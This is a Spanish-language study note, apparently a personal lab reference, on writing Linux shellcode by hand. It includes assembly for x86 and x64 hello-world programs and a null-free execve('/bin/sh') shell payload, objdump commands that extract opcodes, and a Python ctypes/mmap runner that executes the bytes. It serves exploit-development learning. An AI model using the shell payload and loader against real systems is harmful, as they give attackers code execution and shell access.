
---
Tags: #shellcode #ensamblador #objdump #linux #rce

---

# ¿Qué es un shellcode? (1 línea)

Pequeño programa en ensamblador diseñado para ejecutarse desde memoria y lograr una acción (p.ej. abrir una shell, ejecutar un comando, escribir texto).

---

# Principios clave (muy corto)

- **Máquina mínima**: instrucciones compactas sin dependencias de libc.
    
- **Sin nulos**: evitar `\x00` si el canal corta con C-strings.
    
- **Arquitectura**: x86 ≠ x64 (registros y syscalls distintos).
    
- **Prueba local**: siempre en VM/lab.
    

---

# Flujo para crear manualmente un shellcode

1. Escribir ensamblador (NASM / GAS).
    
2. Ensamblar y linkar a binario ejecutable.
    
3. Convertir sección .text a opcodes (objdump/ndisasm).
    
4. Limpiar bytes no deseados y comprobar badchars.
    
5. Probar localmente con `ctypes`/`mmap` o inyectar en PoC.
    

---

# Ejemplo A — Hello world (Linux x86, 32-bit)

**1) Código (hello32.asm)**

```asm
section .text
global _start

_start:
    ; write(1, msg, len)
    mov eax, 4        ; sys_write
    mov ebx, 1        ; stdout
    mov ecx, msg
    mov edx, msglen
    int 0x80

    ; exit(0)
    mov eax, 1        ; sys_exit
    xor ebx, ebx
    int 0x80

section .data
msg: db "Hola mundo",0x0a
msglen: equ $-msg

```

**2) Ensamblar y linkar**

`nasm -f elf32 hello32.asm -o hello32.o ld -m elf_i386 hello32.o -o hello32`

**3) Volcar opcodes**

`objdump -d -M intel hello32 | sed -n '/<.text>:/,/<.data>:/p'`

(o extraer solo bytes)

`objdump -d hello32 | awk '/^[[:space:]]+[0-9a-f]+:/ { for(i=2;i<=NF;i++) if($i~/^[0-9a-f]{2}$/) printf "\\x"$i; } END{print ""}'`

**4) Convertir a Python bytearray**

```python
buf = b"\xeb\x1e\x5e..."   # salida de objdump
open("hello32_shellcode.py","wb").write(buf)
print("len:", len(buf))

```

**5) Probar localmente (solo en laboratorio)**

```python
# run_sc.py
import ctypes, mmap

sc = b"\x..."   # pega tu shellcode
size = len(sc)
# reservar RWX
libc = ctypes.CDLL(None)
addr = libc.mmap(0, size, 7, 0x22, -1, 0)  # PROT_READ|WRITE|EXEC, MAP_ANON|PRIVATE
ctypes.memmove(addr, sc, size)
fn = ctypes.CFUNCTYPE(ctypes.c_void_p)(addr)
fn()

```

---

# Ejemplo B — execve("/bin/sh") (Linux x86)

Código clásico compacto (ejemplo):

```asm
section .text
global _start
_start:
    xor eax,eax
    push eax
    push 0x68732f2f    ; "//sh"
    push 0x6e69622f    ; "/bin"
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    mov al, 0xb        ; sys_execve
    int 0x80

```

Generar, volcar opcodes y probar igual que A. `execve` es el payload típico para obtener shell interactiva.

---

# Ejemplo C — Hello world (Linux x64)

Diferencias: registros y syscall vía `syscall`, números distintos.

**hello64.asm**

```asm
section .data
msg: db "Hola mundo",0x0a
len: equ $-msg

section .text
global _start
_start:
    mov rax, 1          ; sys_write
    mov rdi, 1          ; fd stdout
    lea rsi, [rel msg]
    mov rdx, len
    syscall

    mov rax, 60         ; sys_exit
    xor rdi, rdi
    syscall

```

Ensambla:

`nasm -f elf64 hello64.asm -o hello64.o ld hello64.o -o hello64`

Volcar y convertir como antes.

---

# Cómo obtener los opcodes con `objdump` (comando útil)

`objdump -d -M intel ./file | awk '/<.text>:/,/^$/' | awk '/^[[:space:]]+[0-9a-f]+:/ {for(i=2;i<=5;i++) if($i~/^[0-9a-f]{2}$/) printf "\\x"$i}'`

Otra forma más robusta (python):

`objdump -d ./file -j .text | python3 -c "import sys,re; data=sys.stdin.read(); print(''.join(['\\\\x'+b for b in re.findall(r'\\b([0-9a-f]{2})\\b',data)]))"`

Resultado es cadena `\x..` lista para pegar en Python.

---

# Comprobación de badchars y nulos

- Revisa `\x00` en el bytearray: `b'\x00' in buf`.
    
- Si aparecen nulos, reescribe ensamblador (usar registros/push/pop) o usa encoder/avoid instructions that embed 0x00.
    
- Si tu payload pasa por texto de protocolo (CRLF stripping), elimina `\x0a`/`\x0d` o encodifica.
    

---

# Consejos prácticos y limitaciones

- **Tamaño**: cuanto más pequeño mejor. Usa técnicas (egghunter) si el payload es grande.
    
- **Portabilidad**: código con direcciones relativas (`[rel msg]`) en x64 evita problemas PIE.
    
- **Windows**: syscalls y ABI totalmente distintos. Para Windows es más práctico usar `msfvenom` o estudiar APIs Win32 (CreateProcess, WinExec, MessageBox).
    
- **Testeo**: primero probar en binarios locales sin protecciones para validar opcodes y comportamiento.